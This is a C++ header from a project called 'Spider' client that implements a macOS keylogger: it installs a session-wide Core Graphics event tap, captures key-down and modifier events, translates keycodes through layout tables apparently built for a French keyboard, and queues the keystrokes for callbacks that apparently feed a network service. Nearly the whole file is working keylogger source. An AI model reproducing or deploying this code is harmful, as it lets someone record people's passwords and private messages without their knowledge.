//
// Created by roman sztergbaum on 27/09/2017.
//

#ifndef SPIDER_CLIENT_OSXKEYLOGGER_HPP
#define SPIDER_CLIENT_OSXKEYLOGGER_HPP

#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>
#include <memory>
#include <mutex>
#include <thread>
#include <boost/bind.hpp>
#include <boost/circular_buffer.hpp>
#include <boost/variant.hpp>
#include <config/Config.hpp>
#include <Network/IOManager.hpp>
#include <KeyLogger/KeyLogger.hpp>

namespace spi
{
    class OSXKeyLogger : public KeyLogger
    {
        using Events = boost::variant<proto::MouseClick, proto::KeyEvent, proto::MouseMove, proto::WindowChanged>;
    public:
        explicit OSXKeyLogger(net::IOManager &service) noexcept : _service(service), _circularBuffer(10)
        {
            _sharedInstance = this;
        }

        ~OSXKeyLogger() noexcept override
        {
            stop();
        }

        bool setup() noexcept override
        {
            _log(logging::Info) << "Successfully initialized" << std::endl;
            return true;
        }

        void consumeEvents()
        {
            std::lock_guard<std::mutex> _lock_guard(_bufferMutex);

            while (!_circularBuffer.empty()) {
                Events &tmp = _circularBuffer.front();
                _circularBuffer.pop_front();
                switch (tmp.which()) {
                    case 0:
                        _mouseClickCallback(std::move(boost::get<proto::MouseClick>(tmp)));
                        break;
                    case 1: {
                        auto &&mc = boost::get<proto::KeyEvent>(tmp);
                        _log(logging::Debug) << mc.stringify() << std::endl;
                        _keyPressCallback(std::move(boost::get<proto::KeyEvent>(tmp)));
                    }
                        break;
                    case 2:
                        _mouseMoveCallback(std::move(boost::get<proto::MouseMove>(tmp)));
                        break;
                    case 3:
                        _windowChangeCallback(std::move(boost::get<proto::WindowChanged>(tmp)));
                        break;
                    default:
                        break;
                }
            }
            _service.get().post(boost::bind(&OSXKeyLogger::consumeEvents, this));
        }

        bool makeKeyboardEvent(Events &ev, CGEventType type, CGEventRef event) noexcept
        {
            if (_altGrStatus)
                _binding = &_altGr;
            else if (_capsStatus ^ _shiftStatus)
                _binding = &_shifted;
            else
                _binding = &_unaltered;

            proto::KeyEvent ke;

            ke.state = proto::KeyState::Down;
            CGKeyCode keyCode = static_cast<CGKeyCode>(CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode));

            auto it = _binding->find(keyCode);
            if (it == _binding->end())
                return false;
            ke.code = it->second;
            ev = std::move(ke);
            return true;
        }

        bool makeFlagsEvent(Events &ev, CGEventType type, CGEventRef event) noexcept
        {
            switch (static_cast<CGKeyCode>(CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode))) {
                case 57:
                        _capsStatus = !_capsStatus;
                    break;
                case 56:
                    _shiftStatus = !_shiftStatus;
                    break;
                case 61:
                    _altGrStatus = !_altGrStatus;
                    break;
                default:
                    break;
            }
            return true;
        }

        void addInputEvent(CGEventType type, CGEventRef event) noexcept
        {
            Events ev;
            bool ok = false;

            switch (type) {
                case kCGEventKeyDown:
                case kCGEventKeyUp:
                    ok = makeKeyboardEvent(ev, type, event);
                    break;
                case kCGEventFlagsChanged:
                    ok = makeFlagsEvent(ev, type, event);
                    break;
                default:
                    break;
            }
            if (ok) {
                std::lock_guard<std::mutex> guard{_bufferMutex};
                _circularBuffer.push_back(std::move(ev));
            }
        }

        static CGEventRef inputEventCallback([[maybe_unused]] CGEventTapProxy p, CGEventType type, CGEventRef ev,
                                             [[maybe_unused]] void *arg)
        {
            auto shInst = OSXKeyLogger::sharedInstance();

            shInst->addInputEvent(type, ev);
            return ev;
        }

        static void loop() noexcept
        {
            CGEventMask wantedEvents =  CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);
            CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, kCGEventTapOptionDefault,
                                                      wantedEvents, &OSXKeyLogger::inputEventCallback, nullptr);

            CFRunLoopSourceRef runLoop = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
            sharedInstance()->_loopRef = CFRunLoopGetCurrent();
            CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoop, kCFRunLoopCommonModes);
            CGEventTapEnable(eventTap, true);

            CFRunLoopRun();
        }

        void run() override
        {
            if (!_threadLoop) {
                _log(logging::Info) << "Starting" << std::endl;
                _threadLoop = true;
                _thread = new std::thread{([]() {
                    OSXKeyLogger::loop();
                })};
                _service.get().post(boost::bind(&OSXKeyLogger::consumeEvents, this));
            }
        }

        void stop() override
        {
            if (_threadLoop) {
                _log(logging::Info) << "Shutting down" << std::endl;

                CFRunLoopStop(_loopRef);
                _threadLoop = false;
                if (_thread != nullptr && _thread->joinable()) {
                    _thread->join();
                }
                delete _thread;
                // KILL THREAD
            }
        }

    private:
        net::IOManager &_service;

        boost::circular_buffer<Events> _circularBuffer;
        std::mutex _bufferMutex;

        std::atomic<bool> _threadLoop{false};
        std::thread *_thread{nullptr};

        CFRunLoopRef _loopRef{nullptr};

        static OSXKeyLogger *_sharedInstance;

        bool _altGrStatus{false};
        bool _shiftStatus{false};
        bool _capsStatus{false};

    public:
        static OSXKeyLogger *sharedInstance() noexcept
        {
            return _sharedInstance;
        }

    private:
        static const std::unordered_map<char, proto::KeyCode> _unaltered;
        static const std::unordered_map<char, proto::KeyCode> _shifted;
        static const std::unordered_map<char, proto::KeyCode> _altGr;

        const std::unordered_map<char, proto::KeyCode> *_binding{&_unaltered};
    };

    OSXKeyLogger *OSXKeyLogger::_sharedInstance = nullptr;

    const std::unordered_map<char, proto::KeyCode> OSXKeyLogger::_unaltered = {
        {0,   proto::KeyCode::a},
        {1,   proto::KeyCode::s},
        {2,   proto::KeyCode::d},
        {3,   proto::KeyCode::f},
        {4,   proto::KeyCode::h},
        {5,   proto::KeyCode::g},
        {6,   proto::KeyCode::z},
        {7,   proto::KeyCode::x},
        {8,   proto::KeyCode::c},
        {9,   proto::KeyCode::v},
        {11,  proto::KeyCode::b},
        {12,  proto::KeyCode::q},
        {13,  proto::KeyCode::w},
        {14,  proto::KeyCode::e},
        {15,  proto::KeyCode::r},
        {16,  proto::KeyCode::y},
        {17,  proto::KeyCode::t},
        {18,  proto::KeyCode::_1},
        {19,  proto::KeyCode::_2},
        {20,  proto::KeyCode::_3},
        {21,  proto::KeyCode::_4},
        {22,  proto::KeyCode::_6},
        {23,  proto::KeyCode::_5},
        {25,  proto::KeyCode::_9},
        {26,  proto::KeyCode::_7},
        {28,  proto::KeyCode::_8},
        {29,  proto::KeyCode::_0},
        {31,  proto::KeyCode::o},
        {32,  proto::KeyCode::u},
        {34,  proto::KeyCode::i},
        {35,  proto::KeyCode::p},
//       {36, proto::KeyCode}, //RETURN
        {37,  proto::KeyCode::l},
        {38,  proto::KeyCode::j},
//       {39, proto::KeyCode}, //"
        {40,  proto::KeyCode::k},
//       {41, proto::KeyCode}, //;
//       {42, proto::KeyCode}, //\
//       {43, proto::KeyCode}, //,
//       {44, proto::KeyCode}, // /
        {45,  proto::KeyCode::n},
        {46,  proto::KeyCode::m},
//       {47, proto::KeyCode}, //.
        {48,  proto::KeyCode::Tab},
        {49,  proto::KeyCode::Space},
//       {50, proto::KeyCode}, //`
//       {51, proto::KeyCode}, //DELETE
        {53,  proto::KeyCode::Escape},
//            {55,  proto::KeyCode}, // COMMAND
        {56,  proto::KeyCode::Shift},
        {57,  proto::KeyCode::CapsLock},
        {58,  proto::KeyCode::Alt},
        {59,  proto::KeyCode::Ctrl},
        {60,  proto::KeyCode::Shift}, //right
        {61,  proto::KeyCode::AltGr}, //right
        {62,  proto::KeyCode::Ctrl}, //right
        {63,  proto::KeyCode::Fn},
        {82,  proto::KeyCode::GraveA}, //keypad
        {83,  proto::KeyCode::Ampersand}, //keypad
        {84,  proto::KeyCode::AcuteE}, //keypad
        {85,  proto::KeyCode::DoubleQuote}, //keypad
        {86,  proto::KeyCode::Quote}, //keypad
        {87,  proto::KeyCode::OpeningParenthesis}, //keypad
        {88,  proto::KeyCode::Dash}, //keypad
        {89,  proto::KeyCode::GraveE}, //keypad
        {91,  proto::KeyCode::Underscore}, //keypad
        {92,  proto::KeyCode::CedillaC}, //keypad
        {96,  proto::KeyCode::F5},
        {97,  proto::KeyCode::F6},
        {98,  proto::KeyCode::F7},
        {99,  proto::KeyCode::F3},
        {100, proto::KeyCode::F8},
        {101, proto::KeyCode::F9},
        {103, proto::KeyCode::F11},
        {109, proto::KeyCode::F10},
        {111, proto::KeyCode::F12},
        {115, proto::KeyCode::Home},
        {116, proto::KeyCode::PageUp},
        {118, proto::KeyCode::F4},
        {120, proto::KeyCode::F2},
        {121, proto::KeyCode::PageDown},
        {122, proto::KeyCode::F1},
        {123, proto::KeyCode::Left},
        {124, proto::KeyCode::Right},
        {125, proto::KeyCode::Down},
        {126, proto::KeyCode::Up}
    };

    const std::unordered_map<char, proto::KeyCode> OSXKeyLogger::_shifted = {
        {0,   proto::KeyCode::A},
        {1,   proto::KeyCode::S},
        {2,   proto::KeyCode::D},
        {3,   proto::KeyCode::F},
        {4,   proto::KeyCode::H},
        {5,   proto::KeyCode::G},
        {6,   proto::KeyCode::Z},
        {7,   proto::KeyCode::X},
        {8,   proto::KeyCode::C},
        {9,   proto::KeyCode::V},
        {11,  proto::KeyCode::B},
        {12,  proto::KeyCode::Q},
        {13,  proto::KeyCode::W},
        {14,  proto::KeyCode::E},
        {15,  proto::KeyCode::R},
        {16,  proto::KeyCode::Y},
        {17,  proto::KeyCode::T},
        {18,  proto::KeyCode::_1},
        {19,  proto::KeyCode::_2},
        {20,  proto::KeyCode::_3},
        {21,  proto::KeyCode::_4},
        {22,  proto::KeyCode::_6},
        {23,  proto::KeyCode::_5},
        {25,  proto::KeyCode::_9},
        {26,  proto::KeyCode::_7},
        {28,  proto::KeyCode::_8},
        {29,  proto::KeyCode::_0},
        {31,  proto::KeyCode::O},
        {32,  proto::KeyCode::U},
        {34,  proto::KeyCode::I},
        {35,  proto::KeyCode::P},
//       {36, proto::KeyCode}, //RETURN
        {37,  proto::KeyCode::L},
        {38,  proto::KeyCode::J},
//       {39, proto::KeyCode}, //"
        {40,  proto::KeyCode::K},
//       {41, proto::KeyCode}, //;
//       {42, proto::KeyCode}, //\
//       {43, proto::KeyCode}, //,
//       {44, proto::KeyCode}, // /
        {45,  proto::KeyCode::N},
        {46,  proto::KeyCode::M},
//       {47, proto::KeyCode}, //.
        {48,  proto::KeyCode::Tab},
        {49,  proto::KeyCode::Space},
//       {50, proto::KeyCode}, //`
//       {51, proto::KeyCode}, //DELETE
        {53,  proto::KeyCode::Escape},
//            {55,  proto::KeyCode}, // COMMAND
        {56,  proto::KeyCode::Shift},
        {57,  proto::KeyCode::CapsLock},
        {58,  proto::KeyCode::Alt},
        {59,  proto::KeyCode::Ctrl},
        {60,  proto::KeyCode::Shift}, //right
        {61,  proto::KeyCode::Alt}, //right
        {62,  proto::KeyCode::Ctrl}, //right
        {63,  proto::KeyCode::Fn},
        {82,  proto::KeyCode::_0}, //keypad
        {83,  proto::KeyCode::_1}, //keypad
        {84,  proto::KeyCode::_2}, //keypad
        {85,  proto::KeyCode::_3}, //keypad
        {86,  proto::KeyCode::_4}, //keypad
        {87,  proto::KeyCode::_5}, //keypad
        {88,  proto::KeyCode::_6}, //keypad
        {89,  proto::KeyCode::_7}, //keypad
        {91,  proto::KeyCode::_8}, //keypad
        {92,  proto::KeyCode::_9}, //keypad
        {96,  proto::KeyCode::F5},
        {97,  proto::KeyCode::F6},
        {98,  proto::KeyCode::F7},
        {99,  proto::KeyCode::F3},
        {100, proto::KeyCode::F8},
        {101, proto::KeyCode::F9},
        {103, proto::KeyCode::F11},
        {109, proto::KeyCode::F10},
        {111, proto::KeyCode::F12},
        {115, proto::KeyCode::Home},
        {116, proto::KeyCode::PageUp},
        {118, proto::KeyCode::F4},
        {120, proto::KeyCode::F2},
        {121, proto::KeyCode::PageDown},
        {122, proto::KeyCode::F1},
        {123, proto::KeyCode::Left},
        {124, proto::KeyCode::Right},
        {125, proto::KeyCode::Down},
        {126, proto::KeyCode::Up}
    };
    const std::unordered_map<char, proto::KeyCode> OSXKeyLogger::_altGr = {
        {6,   proto::KeyCode::Inferior},
        {7,   proto::KeyCode::Superior},
        {9,   proto::KeyCode::DoubleQuote},
        {11,  proto::KeyCode::DoubleQuote},
        {12,  proto::KeyCode::n},
        {14,  proto::KeyCode::Euro},
        {15,  proto::KeyCode::r},
        {16,  proto::KeyCode::y},
        {17,  proto::KeyCode::t},
        {19,  proto::KeyCode::Tilde},
        {20,  proto::KeyCode::Sharp},
        {21,  proto::KeyCode::OpeningBracket},
        {22,  proto::KeyCode::Pipe},
        {23,  proto::KeyCode::OpeningSquareBracket},
        {25,  proto::KeyCode::Caret},
        {26,  proto::KeyCode::BackQuote},
        {28,  proto::KeyCode::Backslash},
        {29,  proto::KeyCode::Arobase},
//       {36, proto::KeyCode}, //RETURN
//       {41, proto::KeyCode}, //;
//       {42, proto::KeyCode}, //\
//       {43, proto::KeyCode}, //,
//       {44, proto::KeyCode}, // /
        {46,  proto::KeyCode::Mu},
//       {47, proto::KeyCode}, //.
        {48,  proto::KeyCode::Tab},
        {49,  proto::KeyCode::Space},
//       {50, proto::KeyCode}, //`
//       {51, proto::KeyCode}, //DELETE
        {53,  proto::KeyCode::Escape},
//            {55,  proto::KeyCode}, // COMMAND
        {56,  proto::KeyCode::Shift},
        {57,  proto::KeyCode::CapsLock},
        {58,  proto::KeyCode::Alt},
        {59,  proto::KeyCode::Ctrl},
        {60,  proto::KeyCode::Shift}, //right
        {61,  proto::KeyCode::Alt}, //right
        {62,  proto::KeyCode::Ctrl}, //right
        {63,  proto::KeyCode::Fn},
        {82,  proto::KeyCode::_0}, //keypad
        {83,  proto::KeyCode::_1}, //keypad
        {84,  proto::KeyCode::_2}, //keypad
        {85,  proto::KeyCode::_3}, //keypad
        {86,  proto::KeyCode::_4}, //keypad
        {87,  proto::KeyCode::_5}, //keypad
        {88,  proto::KeyCode::_6}, //keypad
        {89,  proto::KeyCode::_7}, //keypad
        {91,  proto::KeyCode::_8}, //keypad
        {92,  proto::KeyCode::_9}, //keypad
        {96,  proto::KeyCode::F5},
        {97,  proto::KeyCode::F6},
        {98,  proto::KeyCode::F7},
        {99,  proto::KeyCode::F3},
        {100, proto::KeyCode::F8},
        {101, proto::KeyCode::F9},
        {103, proto::KeyCode::F11},
        {109, proto::KeyCode::F10},
        {111, proto::KeyCode::F12},
        {115, proto::KeyCode::Home},
        {116, proto::KeyCode::PageUp},
        {118, proto::KeyCode::F4},
        {120, proto::KeyCode::F2},
        {121, proto::KeyCode::PageDown},
        {122, proto::KeyCode::F1},
        {123, proto::KeyCode::Left},
        {124, proto::KeyCode::Right},
        {125, proto::KeyCode::Down},
        {126, proto::KeyCode::Up}
    };
}

namespace spi::details
{
    static always_inline KeyLogPtr createKeyLogger(net::IOManager &service)
    {
        return std::make_unique<OSXKeyLogger>(service);
    }
}

#endif //SPIDER_CLIENT_OSXKEYLOGGER_HPP
